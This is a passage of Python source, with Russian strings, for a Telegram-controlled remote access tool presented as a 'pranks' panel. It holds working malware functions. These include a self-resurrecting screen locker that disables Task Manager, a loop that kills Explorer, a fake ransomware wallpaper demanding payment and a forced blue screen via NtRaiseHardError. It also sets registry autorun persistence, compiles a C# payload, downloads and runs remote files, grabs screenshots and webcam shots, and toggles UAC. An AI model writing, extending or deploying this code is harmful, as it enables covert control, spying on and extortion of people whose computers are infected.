    left.place(relx=0.5, rely=0.36, anchor="center")
    entry = _code_entry_tk(root, evt, big_font=16)
    entry.place(relx=0.5, rely=0.72, anchor="center")
    cap = until if until else time.time() + TRAP_CAP

    def tick():
        if stop_now() or (evt is not None and evt.is_set()):
            user32.ClipCursor(None)
            root.destroy()
            return
        if time.time() >= cap:
            write_stop()          # прикол отработал: сами отпускаем, без завтрашнего воскресения
            user32.ClipCursor(None)
            root.destroy()
            return
        user32.ClipCursor(ctypes.byref(box))
        left.config(text="до отпуска: " + str(int((cap - time.time()) // 60) + 1) + " мин")
        root.geometry("+" + str(box.l) + "+" + str(box.t))
        root.lift()
        root.attributes("-topmost", True)
        entry.focus_force()
        root.after(70, tick)
    tick()
    root.mainloop()

def chaos_tick():
    for _ in range(random.randint(2, 5)):
        subprocess.Popen(
            'start "" /MAX cmd /k "color 4F&title ЗОНА ВИРУСА&echo ХОЗЯИН ЭТОЙ МАШИНЫ БОЛЬШЕ НЕ ТЫ&ping -n 99999 127.0.0.1 >nul"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(0.25)
    for _ in range(28):
        user32.keybd_event(0xAF, 0, 0, 0)
    user32.keybd_event(0x14, 0, 0, 0)
    user32.keybd_event(0x14, 0, 2, 0)
    pt = _P2()
    user32.GetCursorPos(ctypes.byref(pt))
    user32.SetCursorPos(pt.x + random.randint(-70, 70), pt.y + random.randint(-70, 70))
    try:
        import winsound
        winsound.Beep(random.choice((740, 930, 1100)), 280)
    except Exception:
        pass
    time.sleep(1.5)

def main():
    user32.SetProcessDPIAware()
    write_pid()
    log("старт")
    threading.Thread(target=guardian, daemon=True).start()
    code_evt = None
    if JOB in ("winlock", "trap") and ROLE == "a":
        code_evt = install_hook()

        def code_watch():
            code_evt.wait()
            if not stop_now():
                write_abort()
            DEAD.set()
        threading.Thread(target=code_watch, daemon=True).start()

    if JOB == "winlock" and ROLE == "a":
        while not (stop_now() or (code_evt and code_evt.is_set())):
            try:
                overlay_winlock(code_evt)
            except Exception:
                pass
            time.sleep(0.15)
    elif JOB == "trap" and ROLE == "a":
        t_cap = time.time() + TRAP_CAP
        while not (stop_now() or (code_evt and code_evt.is_set())) and time.time() < t_cap:
            try:
                overlay_trap(code_evt, t_cap)
            except Exception:
                pass
            time.sleep(0.1)
        user32.ClipCursor(None)
        if time.time() >= t_cap and not (stop_now() or (code_evt and code_evt.is_set())):
            write_stop()
    elif JOB == "wall":
        wall = BASE / "wall.png"
        while not stop_now() and not DEAD.is_set():
            if wall.exists():
                try:
                    user32.SystemParametersInfoW(0x14, 0, str(wall), 3)
                except Exception:
                    pass
                time.sleep(3.0)
            else:
                time.sleep(4.0)
    elif JOB == "explorer":
        while not stop_now() and not DEAD.is_set():
            subprocess.run("taskkill /f /im explorer.exe", shell=True, capture_output=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(1.5)
        try:
            subprocess.Popen("start explorer.exe", shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
    elif JOB == "madness":
        while not stop_now() and not DEAD.is_set():
            chaos_tick()
    else:
        while not DEAD.is_set():
            if stop_now():
                break
            time.sleep(1.0)
    cleanup_pid()
    DEAD.set()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log("падение: " + repr(e))
        cleanup_pid()
'''

def _v_write_script():
    VIRUS_DIR.mkdir(exist_ok=True)
    (VIRUS_DIR / "virus.py").write_text(VIRUS_SRC, encoding="utf-8")
    try:
        src = Path(__file__).resolve().parent / "toxik.cs"
        if src.exists():
            cs = VIRUS_DIR / "toxik.cs"
            text = src.read_text(encoding="utf-8")
            if not cs.exists() or cs.read_text(encoding="utf-8") != text:
                cs.write_text(text, encoding="utf-8")
    except Exception:
        pass

def _v_compile():
    """нативная сборка юнита toxik.exe (C#/.NET 4, csc без SDK). путь exe или None"""
    try:
        cs = VIRUS_DIR / "toxik.cs"
        exe = VIRUS_DIR / "toxik.exe"
        if not cs.exists():
            return None
        if exe.exists() and exe.stat().st_mtime >= cs.stat().st_mtime:
            return str(exe)
        csc = None
        windir = os.environ.get("WINDIR", r"C:\Windows")
        for cand in (Path(windir) / "Microsoft.NET" / "Framework64" / "v4.0.30319" / "csc.exe",
                     Path(windir) / "Microsoft.NET" / "Framework" / "v4.0.30319" / "csc.exe"):
            if cand.exists():
                csc = str(cand)
                break
        if not csc:
            return None
        r = subprocess.run([csc, "/nologo", "/target:winexe", "/platform:anycpu", "/optimize+",
                            "/out:" + str(exe),
                            "/r:System.dll", "/r:System.Core.dll", "/r:System.Drawing.dll",
                            "/r:System.Windows.Forms.dll", "/r:Microsoft.CSharp.dll", str(cs)],
                           capture_output=True, text=True, timeout=120,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        log_line = f"csc exit={r.returncode} {(r.stderr or '')[-160:]}"
        try:
            logging.info("[toxik] " + log_line)
        except Exception:
            pass
        if exe.exists() and exe.stat().st_mtime >= cs.stat().st_mtime:
            return str(exe)
    except Exception as e:
        try:
            logging.exception("[toxik] csc fail: %s", e)
        except Exception:
            pass
    return None

def _v_running(job: str) -> bool:
    for role in ("a", "b"):
        try:
            pid = int((VIRUS_DIR / f"{job}_{role}.pid").read_text().strip())
        except Exception:
            continue
        if pid in (os.getpid(),):
            continue
        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if h:
            ctypes.windll.kernel32.CloseHandle(h)
            return True
    return False

def _v_spawn(job: str):
    _v_write_script()
    try:
        (VIRUS_DIR / "abort.flag").unlink()
    except Exception:
        pass
    stopf = VIRUS_DIR / f"stop_{job}.flag"
    if stopf.exists():
        stopf.unlink()
    exe = _v_compile()
    base = [exe] if exe else [sys.executable, str(VIRUS_DIR / "virus.py")]
    for role in ("a", "b"):
        subprocess.Popen(base + [job, role],
                         cwd=str(VIRUS_DIR),
                         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)

def _block_taskmgr():
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, POLICY_PATH) as k:
            winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass

def _unblock_taskmgr():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, POLICY_PATH, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "DisableTaskMgr")
    except Exception:
        pass

def _v_write_wallpng():
    VIRUS_DIR.mkdir(exist_ok=True)
    img = Image.new("RGB", (1920, 1080), (5, 5, 5))
    d = ImageDraw.Draw(img)
    try:
        f1 = ImageFont.truetype("arialbd.ttf", 84)
        f2 = ImageFont.truetype("arial.ttf", 36)
    except Exception:
        f1 = f2 = ImageFont.load_default()
    d.text((960, 200), "☠ СИСТЕМА ЗАХВАЧЕНА ☠", anchor="mm", font=f1, fill=(255, 30, 30))
    d.multiline_text((960, 430), "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ\nAES-256-CBC  +  RSA-4096\nвосстановление без ключа невозможно",
                     anchor="mm", font=f2, fill=(214, 214, 214), align="center")
    d.text((960, 640), "ключ: 0x82F1-AB34-9D7E-44C1\nоткуп: 3000₽ · счёт не истекает никогда",
           anchor="mm", font=f2, fill=(255, 100, 100))
    d.text((960, 1020), "не выключай питание — станет только хуже", anchor="mm",
           font=f2, fill=(150, 150, 150))
    img.save(VIRUS_DIR / "wall.png", "PNG")

def v_deploy_winlock() -> str:
    if _v_running("winlock"):
        return "💀 винлокер уже сидит внутри — снимать через 🆘"
    _v_spawn("winlock")
    _block_taskmgr()
    unit = "🧬 C#" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python"
    return (f"💀 ВИНЛОКЕР НАВСЕГДА заехал ({unit}):\n"
            "на экране есть ПОЛЕ ВВОДА «ключ владельца» — набери там\n"
            "0007 или sos, и машина отпустит всё сразу.\n"
            "ESC/WIN/Alt+Tab/Alt+F4/диспетчер — замурованы железно,\n"
            "процессов двое, убьёшь одного — второй воскресит.\n"
            "снять: 🆘 отсюда или код в поле")

def v_deploy_explorer() -> str:
    if _v_running("explorer"):
        return "🗑 убийца проводника уже на смене"
    _v_spawn("explorer")
    _block_taskmgr()
    subprocess.Popen("taskkill /f /im explorer.exe", shell=True,
                     creationflags=subprocess.CREATE_NO_WINDOW)
    return ("🗑 УБИЙЦА ПРОВОДНИКА: explorer добивают каждые 1.5с —\n"
            "пуск, панель и папки умерли. диспетчер тоже замурован.\n"
            "снять: 🆘 (проводник оживёт сам)")

def v_deploy_wall() -> str:
    if _v_running("wall"):
        return "👁 обои-могила уже висят"
    _v_write_script()
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    _v_write_wallpng()
    _v_spawn("wall")
    return ("🖼 ОБОИ-МОГИЛА встали: каждые 3с их протирают заново —\n"
            "поменять их нельзя. старые обои запомнены.\n"
            "снять: 🆘 (старые вернутся)")

def v_deploy_trap() -> str:
    if _v_running("trap"):
        return "🔒 мышь уже в камере"
    _v_spawn("trap")
    _block_taskmgr()
    unit = "🧬 C#" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python"
    return (f"🔒 МЫШЬ-ЗАЛОЖНИК ({unit}, прикол временный):\n"
            "камера-окно с полем ввода едет к курсору, курсор прикован\n"
            "к камере. сама отпустит через 10 минут.\n"
            "раньше: набери в поле 0007 или sos, либо 🆘 отсюда")

def v_deploy_madness() -> str:
    if _v_running("madness"):
        return "🌀 вечное безумие уже бушует"
    _v_spawn("madness")
    return ("🌀 ВЕЧНОЕ БЕЗУМИЕ: конвейер cmd-окон, сирены,\n"
            "громкости в потолок и рывков мыши — без выходных.\n"
            "снять: 🆘")

def v_bsod_bg():
    time.sleep(2.0)
    try:
        ntdll = ctypes.windll.ntdll
        old, resp = ctypes.c_ulong(0), ctypes.c_ulong(0)
        ntdll.RtlAdjustPrivilege.argtypes = [ctypes.c_ulong, ctypes.c_int, ctypes.c_int,
                                             ctypes.POINTER(ctypes.c_ulong)]
        ntdll.NtRaiseHardError.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
                                           ctypes.c_void_p, ctypes.c_ulong,
                                           ctypes.POINTER(ctypes.c_ulong)]
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(old))      # SeShutdownPrivilege
        ntdll.NtRaiseHardError(0xC000007B, 0, 0, None, 6, ctypes.byref(resp))
    except Exception:
        pass

def _v_write_flags():
    VIRUS_DIR.mkdir(exist_ok=True)
    try:
        (VIRUS_DIR / "abort.flag").write_text("x")
    except Exception:
        pass
    for job in VIRUS_JOBS:
        try:
            (VIRUS_DIR / f"stop_{job}.flag").write_text("x")
        except Exception:
            pass

def _sweep_virus_processes() -> int:
    # добиваем ЛЮБОЕ, что запущено из virus.py и ВСЁ, что называется toxik.exe —
    # pid-файлы даже не нужны
    ps = ("Get-CimInstance Win32_Process | "
          "Where-Object { ($_.Name -in 'python.exe','pythonw.exe','toxik.exe') -and "
          "($_.CommandLine -like '*virus.py*' -or $_.Name -eq 'toxik.exe') } | "
          "ForEach-Object { taskkill /f /t /pid $($_.ProcessId) | Out-Null; $_.ProcessId }")
    try:
        out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                             capture_output=True, text=True, timeout=25,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        return len([l for l in (out.stdout or "").splitlines() if l.strip()])
    except Exception:
        return 0

def _v_kill_pids() -> int:
    k32 = ctypes.windll.kernel32
    killed = 0
    for job in VIRUS_JOBS:
        for role in ("a", "b"):
            pf = VIRUS_DIR / f"{job}_{role}.pid"
            try:
                pid = int(pf.read_text().strip())
            except Exception:
                try:
                    pf.unlink()
                except Exception:
                    pass
                continue
            if pid == os.getpid():
                continue
            subprocess.run(f"taskkill /f /t /pid {pid}", shell=True, capture_output=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            h = k32.OpenProcess(0x0001, False, pid)      # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
                killed += 1
            try:
                pf.unlink()
            except Exception:
                pass
    return killed

def _v_restore_machine():
    ctypes.windll.user32.ClipCursor(None)
    _unblock_taskmgr()
    try:
        orig = (DATA_DIR / "orig_wall.txt").read_text(encoding="utf-8").strip()
        if orig and Path(orig).exists():
            _wall_set(orig)
            (DATA_DIR / "orig_wall.txt").unlink()
    except Exception:
        pass
    subprocess.Popen("start explorer.exe", shell=True,
                     creationflags=subprocess.CREATE_NO_WINDOW)

def v_kill_all() -> str:
    _v_write_flags()
    time.sleep(2.2)
    killed = _v_kill_pids()
    swept = _sweep_virus_processes()
    _v_restore_machine()
    return (f"🆘 ЗАЧИСТКА ГОТОВА: процессы — kill по pid {killed} + поиск по cmdline ещё {swept},\n"
            "abort-флаг расставлен ВСЕМ (код 0007 теперь тоже гасит всё разом),\n"
            "диспетчер отмяк, обои и проводник возвращены, мышь отпущена.\n"
            "если что-то дышит — жми 🧨, если был автовозжиг — ♻️ ВЫКЛ")

def v_panic() -> str:
    # пулевая: работает даже когда pid-файлы потерялись, а пары воскресли
    _v_write_flags()
    first = _sweep_virus_processes()
    time.sleep(1.5)
    second = _sweep_virus_processes()      # добиваем воскресших из-под могилы
    by_pid = _v_kill_pids()
    time.sleep(0.5)
    third = _sweep_virus_processes()
    _v_restore_machine()
    return (f"🧨 ПУЛЯ ДОСТАВЛЕНА: заход1 {first} шт, заход2 {second} шт, заход3 {third} шт (+по pid {by_pid}),\n"
            "каждый снимок убивает ВСЁ из virus.py и весь toxik.exe. диспетчер/мышь/обои/проводник — возвращены.\n"
            "если четвёртый раз что-то воскреснет — перезагрузка и проверь ♻️ автозапуск")

def _persist_installed() -> bool:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
            winreg.QueryValueEx(k, PERSIST_NAME)
        return True
    except Exception:
        return False

def v_persist_on() -> str:
    _v_write_script()
    exe = _v_compile()
    vbs = VIRUS_DIR / "vboot.vbs"
    lines = ['Set sh = CreateObject("WScript.Shell")']
    if exe:
        # нативный юнит: exe сам умеет пара-режимы, окно не нужно совсем
        for job, role in (("winlock", "a"), ("winlock", "b"), ("trap", "a"), ("trap", "b")):
            lines.append('sh.Run """' + str(exe) + '"" ' + job + " " + role + ', 0, False')
        unit_note = "юнит: 🧬 C# (toxik.exe)"
    else:
        pyw = Path(sys.executable).with_name("pythonw.exe")
        if not pyw.exists():
            pyw = Path(sys.executable)
        q = "Chr(34)"
        for job, role in (("winlock", "a"), ("winlock", "b"), ("trap", "a"), ("trap", "b")):
            lines.append("sh.Run " + q + " & \"" + str(pyw) + "\" & " + q +
                         " & \" \" & " + q + " & \"" + str(VIRUS_DIR / "virus.py") +
                         "\" & " + q + " & \" " + job + " " + role + "\", 0, False")
        unit_note = "юнит: 🐍 python"
    vbs.write_bytes("\r\n".join(lines).encode("cp1251", errors="replace"))
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
        winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, f'wscript.exe "{vbs}"')
    return (f"♻️ АВТОЗАПУСК ЗАПИХАН ({unit_note}): винлокер и мышь-заложник\n"
            "после перезагрузки встанут сами, тихо, без консольных окон.\n"
            "перезагрузка — больше не спасение. выключить: ♻️ ВЫКЛ")

def v_persist_off() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_PATH, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, PERSIST_NAME)
    except Exception:
        return "♻️ автозапуска и так не было"
    return "♻️ автозапуск выпилен из системы — перезагрузка снова спасает"

def v_status() -> str:
    alive = []
    for job in VIRUS_JOBS:
        roles = []
        for role in ("a", "b"):
            try:
                pid = int((VIRUS_DIR / f"{job}_{role}.pid").read_text().strip())
            except Exception:
                continue
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if h:
                ctypes.windll.kernel32.CloseHandle(h)
                roles.append(role)
        if roles:
            alive.append(f"  💀 {job}: роли {'+'.join(roles)} живы")
    persist = "вкл (после ребута сами вернутся)" if _persist_installed() else "выкл"
    unit = "🧬 C# (toxik.exe собран)" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python (exe ещё не собирали)"
    body = "\n".join(alive) if alive else "  (ни одного живого — стерильно)"
    return f"📊 СТАТУС ВИРУСОВ\n🧬 юнит: {unit}\n{body}\n♻️ автозапуск: {persist}"

VR_TITLES = {
    "vr_winlock": "🏴 ВИНЛОКЕР НАВСЕГДА",
    "vr_explorer": "🗑 УБИТЬ ПРОВОДНИКА",
    "vr_wall": "🖼 ОБОИ-МОГИЛА",
    "vr_trap": "🔒 МЫШЬ-ЗАЛОЖНИК",
    "vr_madness": "🌀 ВЕЧНОЕ БЕЗУМИЕ",
    "vr_status": "📊 Статус вирусов",
    "vr_panic": "🧨 ПУЛЕВОЕ УБИЙСТВО",
    "vr_persist": "♻️ АВТОЗАПУСК ВКЛ",
    "vr_nopersist": "♻️ АВТОЗАПУСК ВЫКЛ",
    "vr_off": "🆘 Снять всё",
}

def cat_virus_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🏴 ВИНЛОКЕР НАВСЕГДА", "vr_winlock"), ("🗑 УБИТЬ ПРОВОДНИКА", "vr_explorer")],
        [("🖼 ОБОИ-МОГИЛА", "vr_wall"), ("🔒 МЫШЬ-ЗАЛОЖНИК", "vr_trap")],
        [("🌀 ВЕЧНОЕ БЕЗУМИЕ", "vr_madness"), ("💀 БСОД НАСТОЯЩИЙ", "vr_bsod")],
        [("♻️ АВТОЗАПУСК ВКЛ", "vr_persist"), ("♻️ АВТОЗАПУСК ВЫКЛ", "vr_nopersist")],
        [("📊 Статус", "vr_status"), ("🧨 ПУЛЕВОЕ УБИЙСТВО", "vr_panic")],
        [("🆘 Снять всё", "vr_off"), ("⬅️ Приколы", "pranks")],
    )

# ---------- диспетчер приколов ----------
LOOP_TITLES = {"floodcmd": "🍕 Флуд cmd", "floodpop": "💬 Окон-бомба", "flooddrunk": "🌀 Мышь пьяная"}

THREAD_PRANKS: dict[str, callable] = {
    "pr_bsod":      _p_bsod,       "pr_update":   _p_update,
    "pr_rick":      rickroll,      "pr_invert":   _p_invert,
    "pr_blackout":  _p_blackout,   "pr_monoff":   _p_monoff,
    "pr_rotate":    rotate_display,"pr_flicker":  _p_flicker,
    "pr_dance":     _p_dance,      "pr_magnet":   _p_magnet,
    "pr_edges":     _p_edges,      "pr_jail":     _p_jail,
    "pr_swap":      mouse_toggle,  "pr_cd":       _p_cd,
    "pr_icons":     icons_toggle,  "pr_wallsub":  _p_wallpaper,
    "pr_wallstare": _p_wallstare,  "pr_wallback": _wall_restore,
    "pr_notepad":   _p_notepad,    "pr_beep":     _p_beep,
    "pr_siren":     _p_siren,      "pr_voice":    _p_voice,
    "pr_volume":    _p_volume,     "pr_caps":     _p_caps,
    "pr_player":    _p_player,     "pr_winlock":  _p_winlock,
    "pr_format":    _p_format,     "pr_hacker":   _p_hacker,
    "pr_battery":   _p_battery,    "pr_screamer": _p_screamer,
    "pr_lock":      _p_lock,       "pr_msgbox":   _p_msgbox,
    "pr_apocalypse":_p_apocalypse, "pr_judgment": _p_judgment,
    "pr_hkhide":    hide_cad,      "pr_hkshow":   show_cad,
    "pr_uacoff":    (lambda: uac_set(0)),
    "pr_uacon":     (lambda: uac_set(1)),
    "vr_winlock":   v_deploy_winlock,   "vr_explorer": v_deploy_explorer,
    "vr_wall":      v_deploy_wall,      "vr_trap":     v_deploy_trap,
    "vr_madness":   v_deploy_madness,   "vr_status":   v_status,
    "vr_persist":   v_persist_on,       "vr_nopersist": v_persist_off,
    "vr_off":       v_kill_all,         "vr_panic":    v_panic,
}

CAT_KBS = {
    "cat_screen":  ("🪟 ЭКРАН И ОКНА", cat_screen_kb),
    "cat_mouse":   ("🖱 ПЕРИФЕРИЯ", cat_mouse_kb),
    "cat_desktop": ("🖥 СТОЛ И ТЕМЫ", cat_desktop_kb),
    "cat_sound":   ("🔊 ЗВУК", cat_sound_kb),
    "cat_hard":    ("🏴 ЖЁСТКИЕ (18+)", cat_hard_kb),
    "cat_combo":   ("💀 КОМБО-КОШМАР", cat_combo_kb),
    "cat_sys":     ("🙈 СИСТЕМА-ШУТКИ", cat_sys_kb),
    "cat_virus":   ("☠️ НАСТОЯЩИЕ ВИРУСЫ", cat_virus_kb),
}

# тап → своя категория: после прикола остаёмся в его меню, не выкидываем на главное
PRANK_HOME: dict[str, str] = {}
for _cat, (_t, _mk) in CAT_KBS.items():
    for _row in _mk().inline_keyboard:
        for _b in _row:
            if _b.callback_data and _b.callback_data not in ("pranks", "main"):
                PRANK_HOME[_b.callback_data] = _cat

async def restore_cat(cb, ctx: ContextTypes.DEFAULT_TYPE, chat_id: int):
    cat = PRANK_HOME.get(cb.data)
    if not cat:
        await send_menu(chat_id, ctx)
        return
    title, mk_fn = CAT_KBS[cat]
    try:
        await cb.message.edit_text(f"{title}\nпредыдущий улетел — тапай следующий", reply_markup=mk_fn())
    except Exception:
        pass   # меню уже на экране — клавиатура жива, трогать нечего

async def run_thread_prank(cb, ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, jid: str):
    fn = THREAD_PRANKS[jid]
    title = VR_TITLES.get(cb.data, cb.data)
    if prank_busy(title):
        await ctx.bot.send_message(chat_id, f"уже крутится ({title}), не повторяй")
        await restore_cat(cb, ctx, chat_id)
        return
    await cb.message.edit_text(f"🚀 <b>{title}</b> — запускаю", parse_mode="HTML")
    loop = asyncio.get_running_loop()
    pool = RESCUE_POOL if jid in ("vr_off", "vr_panic") else POOL
    try:
        result = await loop.run_in_executor(pool, fn)
        await ctx.bot.send_message(chat_id, result)
    except Exception as e:
        await ctx.bot.send_message(chat_id, f"❌ шутка сорвалась: {e}")
    finally:
        pranks_running.pop(title, None)
    await restore_cat(cb, ctx, chat_id)

# ---------- качалка (через socks5 из 1.py) ----------
async def download_and_run(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, url: str):
    name = os.path.basename(urlparse(url).path) or ("file_" + uuid.uuid4().hex[:8])
    dst = DATA_DIR / name
    async with httpx.AsyncClient(proxy=PROXY_URL or None, timeout=600, follow_redirects=True,
                                 headers={"User-Agent": "Mozilla/5.0"}) as c:
        r = await c.get(url)
        data = r.content
    if not data:
        await ctx.bot.send_message(chat_id, "❌ пусто на том конце — качалка не удалась")
        return
    dst.write_bytes(data)
    await ctx.bot.send_message(chat_id, f"💾 скачано {len(data):,} Б → {dst}\n🚀 пробую запустить")
    try:
        await ctx.bot.send_message(chat_id, launch_by_path(str(dst)))
    except Exception as e:
        await ctx.bot.send_message(chat_id, f"💾 скачан, но не завёлся: {e}")

# ---------- текст/фото ----------
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    uid = update.effective_user.id
    text = (update.message.text or "").strip()

    if uid in pending and pending[uid] == "upload":
        await update.message.reply_text("жду документ 📤, не текст — в меню: 📤 Загрузить файл")
        return
    if uid in pending and pending[uid] == "wallpaper":
        await update.message.reply_text("жду картинку 🌆, не текст — в меню: 🌆 Обои с фото")
        return
    mode = pending.pop(uid, None)
    if not mode:
        await send_menu(update.effective_chat.id, ctx)
        return
    if not text:
        await update.message.reply_text("пусто — набери заново")
        return
    if mode == "download":
        if not text.lower().startswith(("http://", "https://")):
            pending[uid] = "download"
            await update.message.reply_text("❌ это не ссылка — нужно http…/https…")
            return
        if "." not in urlparse(text).path:
            pending[uid] = "download"
            await update.message.reply_text("❌ в ссылке нет имени файла — качать нечего")
            return
        await update.message.reply_text("⏳ качаю через немца…")
        try:
            await download_and_run(ctx, update.effective_chat.id, text)
        except Exception as e:
            await update.message.reply_text(f"❌ качалка сломалась: {e}")
        await send_menu(update.effective_chat.id, ctx)
        return
    if mode == "runfile":
        try:
            await update.message.reply_text(launch_by_path(text))
        except Exception as e:
            await update.message.reply_text(f"❌ не завелось: {e}")
        await send_menu(update.effective_chat.id, ctx)
    else:
        await update.message.reply_text("непонятный режим — тапни кнопку в меню")
        await send_menu(update.effective_chat.id, ctx)

async def save_photo_and_wallpaper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not allowed(update):
        return
    if pending.get(uid) != "wallpaper":
        await update.message.reply_text("фото пока не командую — обои ставятся из меню: 🌆 Обои с фото")
        return
    pending.pop(uid, None)
    msg = update.message.photo[-1]
    tg_file = await ctx.bot.get_file(msg.file_id)
    dst = DATA_DIR / "wallpaper.jpg"
    await tg_file.download_to_drive(str(dst))
    await update.message.reply_text(set_wallpaper(dst))

async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    uid = update.effective_user.id
    doc = update.message.document
    if not doc:
        await update.message.reply_text("❌ жду файл-документ")
        return
    if pending.get(uid) == "wallpaper":
        if doc.mime_type and not doc.mime_type.startswith("image"):
            await update.message.reply_text("это не картинка — обои только jpg/png")
            return
        pending.pop(uid, None)
        tg_file = await ctx.bot.get_file(doc.file_id)
        dst = DATA_DIR / (doc.file_name or "wallpaper")
        await tg_file.download_to_drive(str(dst))
        await update.message.reply_text(set_wallpaper(dst))
        return
    pending.pop(uid, None)
    tg_file = await ctx.bot.get_file(doc.file_id)
    data = await tg_file.download_as_bytearray()
    dst = DATA_DIR / doc.file_name
    dst.write_bytes(data)
    await update.message.reply_text(f"💾 сохранено: {dst}")
    try:
        await update.message.reply_text(launch_by_path(str(dst)))
    except Exception as e:
        await update.message.reply_text(f"💾 сохранён, но не запущен: {e}")

# ---------- колбеки ----------
async def cb_tap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        await update.callback_query.answer("нет доступа", show_alert=True)
        return
    cb = update.callback_query
    chat_id = cb.message.chat.id
    uid = update.effective_user.id
    data = cb.data
    await cb.answer()
    if cb.message:                       # тапнутая клавиатура и есть живая панель
        PANEL[chat_id] = cb.message.message_id

    if data.startswith("hostsel:"):
        name = data.split(":", 1)[1]
        if name == "self":
            name = host_label()
        known = {host_label()} | set(HOST_TITLES)
        if name not in known:
            await cb.answer("❌ такого пульта нет", show_alert=False)
            await set_panel(chat_id, ctx, pick_text(), pick_kb())
            return
        SESS[chat_id] = name
        await set_panel(chat_id, ctx, menu_text(chat_id), menu_kb())

    elif data == "whoami":
        await set_panel(chat_id, ctx, pick_text(), pick_kb())

    elif data == "main":
        await cb.message.edit_text(menu_text(chat_id), reply_markup=menu_kb(), parse_mode="HTML")

    elif data == "shot":
        try:
            buf = io.BytesIO()
            ImageGrab.grab(all_screens=True).save(buf, "PNG")
            buf.seek(0)
            await ctx.bot.send_photo(chat_id, buf, filename="screen.png", caption="📸 готово")
        except Exception as e:
            await ctx.bot.send_message(chat_id, f"❌ скрин не вышел:\n<code>{html.escape(str(e))}</code>", parse_mode="HTML")
        await send_menu(chat_id, ctx)

    elif data == "webcam":
        try:
            loop = asyncio.get_running_loop()
            shots = await loop.run_in_executor(POOL, snapshot_webcams)
        except ModuleNotFoundError:
            await cb.message.edit_text("🎥 нет модуля cv2 — поставь: <code>py -m pip install opencv-python-headless</code>", parse_mode="HTML")
            shots = []
        except Exception as e:
            await cb.message.edit_text(f"❌ вебка не снялась:\n<code>{html.escape(str(e))}</code>", parse_mode="HTML")
            shots = []
        if shots:
            for idx, jpg in shots:
                with contextlib.suppress(Exception):
                    await ctx.bot.send_photo(chat_id, io.BytesIO(jpg),
                                             filename=f"webcam_{idx}.jpg", caption=f"🎥 вебка #{idx}")
            extra = "" if len(shots) == 1 else f"\n🎥 всего камер: {len(shots)}"
            await ctx.bot.send_message(chat_id, "🎥 снимок с вебки доставлен" + extra)
            await send_menu(chat_id, ctx)

    elif data == "status":
        import platform, getpass
        await cb.message.edit_text(
            f"📊 <b>СТАТУС ПУЛЬТА</b>\n"
            f"🖥 машина: <code>{html.escape(platform.node())}</code>\n"
            f"🪟 ось: win {platform.win32_ver()[0]}\n"
            f"👤 юзер: <code>{html.escape(getpass.getuser())}</code>\n"
            f"🐍 питон: {sys.version.split()[0]}\n"
            f"🌍 сеть: socks5 на борту\n"
            f"🕐 время: <code>{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</code>",
            reply_markup=kb([("⬅️ Меню", "main")]), parse_mode="HTML")

    elif data == "run":
        pending[uid] = "runfile"
        await cb.message.edit_text("🚀 <b>ЗАПУСК ФАЙЛА</b>\nнапиши в чат полный путь, например:\n"
                                    "<code>C:\\Users\\Пк\\файл.bat</code>",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "dl":
        pending[uid] = "download"
        await cb.message.edit_text("📥 <b>СКАЧАТЬ И ЗАПУСТИТЬ</b>\nнапиши в чат прямую ссылку на файл (http/https) —\n"
                                    "скачаю через socks5 и запущу на пк сразу",
                                    reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "upload":
        pending[uid] = "upload"
        await cb.message.edit_text("📤 <b>ЗАГРУЗКА ФАЙЛА</b>\nприкрепи файл как <b>документ</b> в этот чат",
                                   reply_markup=prompt_kb(), parse_mode="HTML")

    elif data == "wallpaper":
        pending[uid] = "wallpaper"
        await cb.message.edit_text("🌆 <b>ОБОИ НА СВОЁ ФОТО</b>\nшли картинку в чат — встанет на рабочий стол", reply_markup=prompt_kb())

    elif data == "jokes":
        await cb.message.edit_text("😂 <b>ШУТКИ</b>\nподними себе настроение — жми 🎲",
                                   reply_markup=joke_kb(), parse_mode="HTML")

    elif data == "pranks":
        await cb.message.edit_text("😈 <b>ПРИКОЛЫ</b> — арсенал на все вкусы\n"
                                   "экран / периферия / стол / звук / жёсткие / комбо / система",
